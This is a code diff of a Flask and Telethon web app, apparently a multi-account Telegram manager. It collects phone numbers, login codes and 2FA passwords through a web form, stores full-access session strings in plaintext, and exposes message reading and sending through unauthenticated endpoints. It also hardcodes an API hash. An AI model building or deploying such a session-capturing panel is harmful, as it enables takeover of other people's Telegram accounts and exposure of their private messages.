@@ -5,54 +5,39 @@ from telethon.sessions import StringSession
 import json
 import os
 import asyncio
-import nest_asyncio
+import nest_asyncio  # ADD THIS LINE
 from datetime import datetime
-import concurrent.futures
 
-# Apply nest_asyncio for Render
+# ADD THIS LINE RIGHT HERE
 nest_asyncio.apply()
 
 app = Flask(__name__)
 CORS(app)
 
 # Your API credentials
-API_ID = int(os.environ.get('API_ID', 33465589))
-API_HASH = os.environ.get('API_HASH', '08bdab35790bf1fdf20c16a50bd323b8')
+api_id = 33465589
+api_hash = '08bdab35790bf1fdf20c16a50bd323b8'
 
 # Store temporary data for OTP
 temp_data = {}
 
 # Store accounts persistently
 accounts = []
-ACCOUNTS_FILE = 'accounts.json'
-
-# Load existing accounts if file exists
-if os.path.exists(ACCOUNTS_FILE):
+if os.path.exists('accounts.json'):
     try:
-        with open(ACCOUNTS_FILE, 'r') as f:
+        with open('accounts.json', 'r') as f:
             accounts = json.load(f)
         print(f"✅ Loaded {len(accounts)} accounts")
     except:
         accounts = []
 
 def save_accounts():
-    try:
-        with open(ACCOUNTS_FILE, 'w') as f:
-            json.dump(accounts, f, indent=2)
-    except:
-        pass
+    with open('accounts.json', 'w') as f:
+        json.dump(accounts, f, indent=2)
 
-# Create a thread pool executor for running async functions
-executor = concurrent.futures.ThreadPoolExecutor()
-
+# Helper to run async functions
 def run_async(coro):
-    """Run async coroutine in a new event loop"""
-    loop = asyncio.new_event_loop()
-    asyncio.set_event_loop(loop)
-    try:
-        return loop.run_until_complete(coro)
-    finally:
-        loop.close()
+    return asyncio.run(coro)
 
 @app.route('/')
 def serve_login():
@@ -63,45 +48,42 @@ def serve_dashboard():
     return send_file('dashboard.html')
 
 # -------------------- SEND OTP --------------------
-@app.route('/api/add-account', methods=['POST'])
+@app.route('/api/send-otp', methods=['POST'])
 def send_otp():
     data = request.json
     phone = data.get('phone')
     
-    if not phone:
-        return jsonify({'success': False, 'error': 'Phone number required'})
+    async def send_code():
+        # Create client with empty string session
+        client = TelegramClient(StringSession(), api_id, api_hash)
+        await client.connect()
+        result = await client.send_code_request(phone)
+        # Save the session string (even though not logged in, it contains DC info)
+        session_str = client.session.save()
+        # Disconnect – we don't need the client open
+        await client.disconnect()
+        return result.phone_code_hash, session_str
     
     try:
-        # Create a new event loop for this request
-        loop = asyncio.new_event_loop()
-        asyncio.set_event_loop(loop)
-        
-        # Create client with empty string session
-        client = TelegramClient(StringSession(), API_ID, API_HASH)
-        loop.run_until_complete(client.connect())
-        result = loop.run_until_complete(client.send_code_request(phone))
-        session_str = client.session.save()
-        loop.run_until_complete(client.disconnect())
-        loop.close()
-        
+        phone_code_hash, session_str = run_async(send_code())
         session_id = str(int(datetime.now().timestamp()))
         temp_data[session_id] = {
             'phone': phone,
-            'phone_code_hash': result.phone_code_hash,
-            'session_str': session_str
+            'phone_code_hash': phone_code_hash,
+            'session_str': session_str   # <- Save the session
         }
         print(f"📱 OTP sent to {phone}")
-        return jsonify({'success': True, 'session_id': session_id})
+        return jsonify({'success': True, 'sessionId': session_id})
     except Exception as e:
         print(f"Error: {e}")
         return jsonify({'success': False, 'error': str(e)})
 
 # -------------------- VERIFY OTP --------------------
-@app.route('/api/verify-code', methods=['POST'])
+@app.route('/api/verify-otp', methods=['POST'])
 def verify_otp():
     data = request.json
     code = data.get('code')
-    session_id = data.get('session_id')
+    session_id = data.get('sessionId')
     password = data.get('password', '')
     
     if session_id not in temp_data:
@@ -110,62 +92,58 @@ def verify_otp():
     session = temp_data[session_id]
     phone = session['phone']
     phone_code_hash = session['phone_code_hash']
-    session_str = session['session_str']
+    session_str = session['session_str']   # Get the saved session
+    
+    async def verify():
+        # Recreate client with the SAME session (same DC)
+        client = TelegramClient(StringSession(session_str), api_id, api_hash)
+        await client.connect()
+        try:
+            # Try to sign in
+            await client.sign_in(phone, code, phone_code_hash=phone_code_hash)
+            # Success
+            me = await client.get_me()
+            string_session = client.session.save()  # final authorized session
+            await client.disconnect()
+            return {'success': True, 'me': me, 'string_session': string_session}
+        except errors.SessionPasswordNeededError:
+            if password:
+                await client.sign_in(password=password)
+                me = await client.get_me()
+                string_session = client.session.save()
+                await client.disconnect()
+                return {'success': True, 'me': me, 'string_session': string_session}
+            else:
+                await client.disconnect()
+                return {'success': False, 'twofa_required': True}
+        except Exception as e:
+            await client.disconnect()
+            return {'success': False, 'error': str(e)}
     
     try:
-        loop = asyncio.new_event_loop()
-        asyncio.set_event_loop(loop)
-        
-        client = TelegramClient(StringSession(session_str), API_ID, API_HASH)
-        loop.run_until_complete(client.connect())
-        
-        try:
-            loop.run_until_complete(client.sign_in(phone, code, phone_code_hash=phone_code_hash))
-            me = loop.run_until_complete(client.get_me())
-            string_session = client.session.save()
-            loop.run_until_complete(client.disconnect())
-            loop.close()
-            
+        result = run_async(verify())
+        if result.get('success'):
+            me = result['me']
+            string_session = result['string_session']
+            # Save account
             account = {
                 'id': len(accounts) + 1,
                 'phone': phone,
                 'name': me.first_name or 'User',
                 'username': me.username or '',
-                'session': string_session,
+                'string_session': string_session,
                 'date': str(datetime.now())
             }
             accounts.append(account)
             save_accounts()
+            # Clean up temp data
             del temp_data[session_id]
             print(f"✅ Account added: {phone}")
-            return jsonify({'success': True, 'account': account})
-            
-        except errors.SessionPasswordNeededError:
-            if password:
-                loop.run_until_complete(client.sign_in(password=password))
-                me = loop.run_until_complete(client.get_me())
-                string_session = client.session.save()
-                loop.run_until_complete(client.disconnect())
-                loop.close()
-                
-                account = {
-                    'id': len(accounts) + 1,
-                    'phone': phone,
-                    'name': me.first_name or 'User',
-                    'username': me.username or '',
-                    'session': string_session,
-                    'date': str(datetime.now())
-                }
-                accounts.append(account)
-                save_accounts()
-                del temp_data[session_id]
-                print(f"✅ Account added: {phone} (with 2FA)")
-                return jsonify({'success': True, 'account': account})
-            else:
-                loop.run_until_complete(client.disconnect())
-                loop.close()
-                return jsonify({'success': False, 'need_password': True, 'message': '2FA password required'})
-                
+            return jsonify({'success': True})
+        elif result.get('twofa_required'):
+            return jsonify({'success': False, 'twoFactorRequired': True})
+        else:
+            return jsonify({'success': False, 'error': result.get('error', 'Unknown error')})
     except Exception as e:
         print(f"Error: {e}")
         return jsonify({'success': False, 'error': str(e)})
@@ -177,8 +155,7 @@ def get_accounts():
         'id': a['id'],
         'phone': a['phone'],
         'name': a['name'],
-        'username': a.get('username', ''),
-        'session': a.get('session', a.get('string_session', ''))
+        'username': a['username']
     } for a in accounts]
     return jsonify({'success': True, 'accounts': account_list})
 
@@ -192,19 +169,12 @@ def get_messages():
     if not account:
         return jsonify({'success': False, 'error': 'Account not found'})
     
-    session_string = account.get('session', account.get('string_session', ''))
-    
-    try:
-        loop = asyncio.new_event_loop()
-        asyncio.set_event_loop(loop)
-        
-        client = TelegramClient(StringSession(session_string), API_ID, API_HASH)
-        loop.run_until_complete(client.connect())
-        
-        dialogs = loop.run_until_complete(client.get_dialogs(limit=30))
+    async def fetch():
+        client = TelegramClient(StringSession(account['string_session']), api_id, api_hash)
+        await client.connect()
+        dialogs = await client.get_dialogs(limit=50)
         chats = []
         all_messages = []
-        
         for dialog in dialogs:
             if dialog.is_user:
                 name = dialog.entity.first_name or 'Unknown'
@@ -212,34 +182,31 @@ def get_messages():
                     name += f" {dialog.entity.last_name}"
             else:
                 name = dialog.name or 'Unknown'
-            
             chat_id = str(dialog.id)
             chats.append({
                 'id': chat_id,
                 'title': name,
                 'unread': dialog.unread_count or 0,
-                'lastMessage': dialog.message.text[:50] if dialog.message and dialog.message.text else '',
-                'lastMessageDate': dialog.message.date.timestamp() if dialog.message else None
+                'lastMessage': dialog.message.text[:50] if dialog.message and dialog.message.text else ''
             })
-            
-            try:
-                msgs = loop.run_until_complete(client.get_messages(dialog.entity, limit=10))
-                for msg in msgs:
-                    if msg and msg.text:
-                        all_messages.append({
-                            'chatId': chat_id,
-                            'text': msg.text,
-                            'date': msg.date.timestamp(),
-                            'out': msg.out
-                        })
-            except:
-                pass
-        
-        loop.run_until_complete(client.disconnect())
-        loop.close()
-        
-        return jsonify({'success': True, 'chats': chats, 'messages': all_messages})
-        
+            # Get last 10 messages
+            msgs = await client.get_messages(dialog.entity, limit=10)
+            for msg in msgs:
+                if msg and msg.text:
+                    all_messages.append({
+                        'chatId': chat_id,
+                        'chatTitle': name,
+                        'text': msg.text,
+                        'date': msg.date.timestamp(),
+                        'out': msg.out
+                    })
+        await client.disconnect()
+        all_messages.sort(key=lambda x: x['date'], reverse=True)
+        return {'chats': chats, 'messages': all_messages[:100]}
+    
+    try:
+        result = run_async(fetch())
+        return jsonify({'success': True, 'chats': result['chats'], 'messages': result['messages']})
     except Exception as e:
         print(f"Error: {e}")
         return jsonify({'success': False, 'error': str(e)})
@@ -256,50 +223,30 @@ def send_message():
     if not account:
         return jsonify({'success': False, 'error': 'Account not found'})
     
-    session_string = account.get('session', account.get('string_session', ''))
+    async def send():
+        client = TelegramClient(StringSession(account['string_session']), api_id, api_hash)
+        await client.connect()
+        try:
+            entity = await client.get_entity(int(chat_id))
+        except:
+            entity = await client.get_entity(chat_id)
+        await client.send_message(entity, message)
+        await client.disconnect()
     
     try:
-        loop = asyncio.new_event_loop()
-        asyncio.set_event_loop(loop)
-        
-        client = TelegramClient(StringSession(session_string), API_ID, API_HASH)
-        loop.run_until_complete(client.connect())
-        
-        try:
-            entity = loop.run_until_complete(client.get_entity(int(chat_id)))
-        except:
-            entity = loop.run_until_complete(client.get_entity(chat_id))
-        
-        loop.run_until_complete(client.send_message(entity, message))
-        loop.run_until_complete(client.disconnect())
-        loop.close()
-        
+        run_async(send())
         return jsonify({'success': True})
-        
     except Exception as e:
-        print(f"Error: {e}")
         return jsonify({'success': False, 'error': str(e)})
-
-# -------------------- REMOVE ACCOUNT --------------------
-@app.route('/api/remove-account', methods=['POST'])
-def remove_account():
-    data = request.json
-    account_id = data.get('accountId')
-    
-    global accounts
-    accounts = [a for a in accounts if a['id'] != account_id]
-    save_accounts()
-    
-    return jsonify({'success': True})
 
 if __name__ == '__main__':
     port = int(os.environ.get('PORT', 5000))
     print('\n' + '='*50)
-    print('📱 TELEGRAM MANAGER - FINAL FIX')
+    print('📱 TELEGRAM MANAGER - ORIGINAL CODE + FIX')
     print('='*50)
     print(f'✅ Loaded {len(accounts)} accounts')
-    print('✅ No event loop errors')
-    print('✅ DC info preserved')
+    print('✅ nest_asyncio applied - no event loop errors')
+    print('✅ DC info preserved for OTP')
     print('='*50 + '\n')
     
-    app.run(host='0.0.0.0', port=port)
+    app.run(host='0.0.0.0', port=port, debug=False, threaded=True)
